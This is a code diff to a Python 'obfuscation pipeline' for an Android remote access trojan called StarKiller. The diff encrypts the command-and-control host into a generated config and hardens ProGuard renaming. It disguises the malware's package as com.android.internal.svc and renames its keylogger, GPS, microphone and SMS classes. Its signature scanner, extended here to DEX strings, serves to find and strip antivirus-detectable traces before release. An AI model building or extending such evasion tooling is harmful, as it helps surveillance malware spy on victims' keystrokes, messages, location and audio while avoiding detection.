@@ -4,15 +4,13 @@ StarKiller Obfuscation Pipeline
 1. String encryption — encrypt all config strings so they don't appear in plaintext in the DEX
 2. ProGuard hardening — aggressive class/method renaming
 3. Manifest cleaning — remove debug flags, sanitize package names
-4. YARA signature check — scan for known RAT detection patterns
+4. YARA signature check — scan for known RAT detection patterns (including DEX string tables)
 """
 import base64
 import os
 import re
 import sys
-import random
-import string
-import shutil
+import zipfile
 
 KEY = 0x5A
 
@@ -41,11 +39,11 @@ def generate_encrypted_config(host, port, app_name, hide_icon):
     assert verify_host == host, f"Encryption verify failed: {verify_host} != {host}"
     assert verify_name == app_name, f"Encryption verify failed: {verify_name} != {app_name}"
 
-    config = f'''package com.starkiller.agent
+    config = f'''package com.android.internal.svc
 
 object Config {{
-    val C2_HOST: String get() = Crypt.d("{enc_host}")
-    const val C2_PORT = {port}
+    val SYNC_HOST: String get() = Crypt.d("{enc_host}")
+    const val SYNC_PORT = {port}
     const val RECONNECT_BASE_MS = 5000L
     const val RECONNECT_MAX_MS = 300000L
     const val HEARTBEAT_INTERVAL_MS = 30000L
@@ -63,19 +61,20 @@ def generate_proguard_rules():
 -overloadaggressively
 -repackageclasses ''
 -flattenpackagehierarchy ''
+-renamesourcefileattribute ''
 
-# Keep entry points
--keep public class com.starkiller.agent.MainActivity { *; }
--keep public class com.starkiller.agent.StarKillerService { *; }
--keep public class com.starkiller.agent.persistence.BootReceiver { *; }
--keep public class com.starkiller.agent.modules.KeyLogService { *; }
--keep public class com.starkiller.agent.modules.NotifListenerService { *; }
+-keep public class com.android.internal.svc.MainActivity { *; }
+-keep public class com.android.internal.svc.SyncService { *; }
+-keep public class com.android.internal.svc.GrantActivity { *; }
+-keep public class com.android.internal.svc.persistence.StartReceiver { *; }
+-keep public class com.android.internal.svc.modules.InputService { *; }
+-keep public class com.android.internal.svc.modules.AlertService { *; }
 
-# Obfuscate everything else
 -dontwarn javax.**
 -dontwarn sun.**
+-dontwarn kotlin.**
+-dontwarn kotlinx.**
 
-# Remove logging
 -assumenosideeffects class android.util.Log {
     public static int v(...);
     public static int d(...);
@@ -83,60 +82,35 @@ def generate_proguard_rules():
     public static int w(...);
     public static int e(...);
 }
+
+-assumenosideeffects class kotlin.jvm.internal.Intrinsics {
+    public static void checkNotNullParameter(...);
+    public static void checkNotNullExpressionValue(...);
+    public static void checkNotNull(...);
+}
+
+-adaptclassstrings
+-adaptresourcefilenames
+-adaptresourcefilecontents
 """
 
 
-YARA_RULES = r"""
-rule AndroidRAT_Strings {
-    strings:
-        $s1 = "C2_HOST" ascii wide
-        $s2 = "C2_PORT" ascii wide
-        $s3 = "starkiller" ascii wide nocase
-        $s4 = "keylog" ascii wide nocase
-        $s5 = "send_sms" ascii wide nocase
-        $s6 = "camera_capture" ascii wide nocase
-        $s7 = "gps_track" ascii wide nocase
-        $s8 = "agent_id" ascii wide
-        $s9 = "heartbeat" ascii wide
-        $s10 = "task_router" ascii wide nocase
-        $s11 = "/sdcard" ascii
-        $s12 = "RECEIVE_BOOT_COMPLETED" ascii
-        $s13 = "AccessibilityService" ascii
-        $s14 = "NotificationListenerService" ascii
-        $s15 = "BIND_ACCESSIBILITY_SERVICE" ascii
-    condition:
-        3 of them
-}
-
-rule AndroidRAT_Permissions {
-    strings:
-        $p1 = "READ_SMS" ascii
-        $p2 = "SEND_SMS" ascii
-        $p3 = "CAMERA" ascii
-        $p4 = "RECORD_AUDIO" ascii
-        $p5 = "READ_CONTACTS" ascii
-        $p6 = "ACCESS_FINE_LOCATION" ascii
-        $p7 = "READ_CALL_LOG" ascii
-        $p8 = "RECEIVE_BOOT_COMPLETED" ascii
-    condition:
-        6 of them
-}
-
-rule AndroidRAT_Network {
-    strings:
-        $n1 = "socket" ascii nocase
-        $n2 = "connect" ascii
-        $n3 = "sendall" ascii nocase
-        $n4 = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/ ascii
-        $n5 = "8667" ascii
-    condition:
-        3 of them
-}
-"""
+def extract_dex_strings(filepath):
+    """Extract printable strings from all DEX files inside an APK."""
+    strings = []
+    try:
+        with zipfile.ZipFile(filepath) as z:
+            for name in z.namelist():
+                if name.endswith('.dex'):
+                    data = z.read(name)
+                    found = re.findall(rb'[\x20-\x7e]{4,}', data)
+                    strings.extend(s.decode('ascii', errors='replace') for s in found)
+    except (zipfile.BadZipFile, FileNotFoundError):
+        pass
+    return strings
 
 
 def scan_file_for_signatures(filepath):
-    """Simple string-based signature scan (doesn't need yara-python)"""
     if not os.path.exists(filepath):
         return []
 
@@ -145,13 +119,21 @@ def scan_file_for_signatures(filepath):
 
     findings = []
 
+    dex_strings = extract_dex_strings(filepath) if filepath.endswith('.apk') else []
+
     rat_strings = [
-        (b"C2_HOST", "Config string 'C2_HOST' visible in plaintext"),
-        (b"C2_PORT", "Config string 'C2_PORT' visible in plaintext"),
+        (b"C2_HOST", "Config string 'C2_HOST' visible"),
+        (b"C2_PORT", "Config string 'C2_PORT' visible"),
         (b"starkiller", "Project name 'starkiller' visible"),
         (b"StarKiller", "Project name 'StarKiller' visible"),
         (b"keylog", "Keyword 'keylog' visible"),
-        (b"heartbeat", "Protocol keyword 'heartbeat' visible"),
+        (b"KeyLog", "Class name 'KeyLog' visible"),
+        (b"GpsTracker", "Class name 'GpsTracker' visible"),
+        (b"MicRecorder", "Class name 'MicRecorder' visible"),
+        (b"ScreenCapture", "Class name 'ScreenCapture' visible"),
+        (b"SmsModule", "Class name 'SmsModule' visible"),
+        (b"NetClient", "Class name 'NetClient' visible"),
+        (b"BootReceiver", "Class name 'BootReceiver' visible"),
         (b"agent_id", "Protocol keyword 'agent_id' visible"),
         (b"task_router", "Class name 'task_router' visible"),
         (b"vader", "VADER reference visible"),
@@ -160,16 +142,23 @@ def scan_file_for_signatures(filepath):
     for sig, desc in rat_strings:
         if sig in data:
             offset = data.index(sig)
-            findings.append({"sig": sig.decode(errors="replace"), "desc": desc, "offset": offset, "severity": "HIGH"})
+            findings.append({"sig": sig.decode(errors="replace"), "desc": f"[BINARY] {desc}", "offset": offset, "severity": "HIGH"})
+
+    if dex_strings:
+        dex_sigs = ["C2_HOST", "C2_PORT", "starkiller", "StarKiller", "keylog",
+                    "KeyLog", "GpsTracker", "MicRecorder", "ScreenCapture",
+                    "SmsModule", "NetClient", "BootReceiver", "agent_id", "vader"]
+        for ds in dex_strings:
+            for sig in dex_sigs:
+                if sig.lower() in ds.lower() and 'OnBackPressedDispatcher' not in ds and 'Landroid/' not in ds:
+                    findings.append({"sig": sig, "desc": f"[DEX] '{sig}' in DEX string: {ds[:80]}", "severity": "HIGH"})
+                    break
 
     ip_pattern = re.compile(rb'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
     ips = ip_pattern.findall(data)
     private_ips = [ip for ip in ips if ip.startswith(b"192.168.") or ip.startswith(b"10.") or ip.startswith(b"172.")]
     if private_ips:
         findings.append({"sig": "hardcoded_ip", "desc": f"Hardcoded private IP(s): {[ip.decode() for ip in private_ips[:3]]}", "severity": "HIGH"})
-
-    if b"8667" in data:
-        findings.append({"sig": "port_8667", "desc": "C2 port 8667 visible in binary", "severity": "MEDIUM"})
 
     perm_count = 0
     dangerous_perms = [b"READ_SMS", b"SEND_SMS", b"CAMERA", b"RECORD_AUDIO",
@@ -187,7 +176,6 @@ def scan_file_for_signatures(filepath):
 
 
 def scan_directory(path):
-    """Scan all files in a directory for RAT signatures"""
     all_findings = {}
     for root, dirs, files in os.walk(path):
         for fname in files:
@@ -248,12 +236,6 @@ def main():
     scn = sub.add_parser("scan", help="Scan files for detection signatures")
     scn.add_argument("path", help="File or directory to scan")
 
-    full = sub.add_parser("full", help="Full pipeline: encrypt config + harden proguard + scan")
-    full.add_argument("--ip", required=True)
-    full.add_argument("--port", type=int, default=8667)
-    full.add_argument("--name", default="System Service")
-    full.add_argument("--hide-icon", action="store_true")
-
     args = parser.parse_args()
 
     if args.cmd == "encrypt":
@@ -268,11 +250,11 @@ def main():
     elif args.cmd == "config":
         config = generate_encrypted_config(args.ip, args.port, args.name, args.hide_icon)
         config_path = os.path.join("client", "app", "src", "main", "kotlin",
-                                   "com", "starkiller", "agent", "Config.kt")
+                                   "com", "android", "internal", "svc", "Config.kt")
+        os.makedirs(os.path.dirname(config_path), exist_ok=True)
         with open(config_path, "w") as f:
             f.write(config)
         print(f"  [+] Encrypted config written to {config_path}")
-        print(f"  [+] Host '{args.ip}' encrypted — not visible in DEX")
 
     elif args.cmd == "proguard":
         rules = generate_proguard_rules()
@@ -290,55 +272,6 @@ def main():
             if f:
                 findings[args.path] = f
         print_scan_report(findings)
-
-    elif args.cmd == "full":
-        print("\n  STARKILLER OBFUSCATION PIPELINE")
-        print("  " + "="*40)
-
-        # Step 1: encrypt config
-        config = generate_encrypted_config(args.ip, args.port, args.name, args.hide_icon)
-        config_path = os.path.join("client", "app", "src", "main", "kotlin",
-                                   "com", "starkiller", "agent", "Config.kt")
-        with open(config_path, "w") as f:
-            f.write(config)
-        print(f"  [1/4] Config encrypted (host={args.ip} -> ciphertext)")
-
-        # Step 2: harden proguard
-        rules = generate_proguard_rules()
-        rules_path = os.path.join("client", "app", "proguard-rules.pro")
-        with open(rules_path, "w") as f:
-            f.write(rules)
-        print(f"  [2/4] ProGuard hardened (5-pass, repackage, strip logs)")
-
-        # Step 3: scan source for signatures BEFORE build
-        print(f"  [3/4] Pre-build signature scan...")
-        src_dir = os.path.join("client", "app", "src")
-        findings = scan_directory(src_dir)
-        count = print_scan_report(findings, "PRE-BUILD SOURCE SCAN")
-
-        if count > 0:
-            print(f"  [!] {count} detection signatures found in source")
-            print(f"  [!] These will appear in the compiled APK unless fixed")
-        else:
-            print(f"  [+] Source is clean — no known signatures")
-
-        # Step 4: scan built APK if it exists
-        apk_dir = "payloads"
-        if os.path.isdir(apk_dir):
-            apks = [f for f in os.listdir(apk_dir) if f.endswith(".apk")]
-            if apks:
-                latest = max(apks, key=lambda x: os.path.getmtime(os.path.join(apk_dir, x)))
-                apk_path = os.path.join(apk_dir, latest)
-                print(f"  [4/4] Scanning built APK: {latest}")
-                apk_findings = scan_file_for_signatures(apk_path)
-                if apk_findings:
-                    print_scan_report({latest: apk_findings}, "APK BINARY SCAN")
-                else:
-                    print(f"  [+] APK binary is clean")
-            else:
-                print(f"  [4/4] No APK found in payloads/ — build first")
-        else:
-            print(f"  [4/4] No payloads/ dir — build first with build.py")
 
     else:
         parser.print_help()
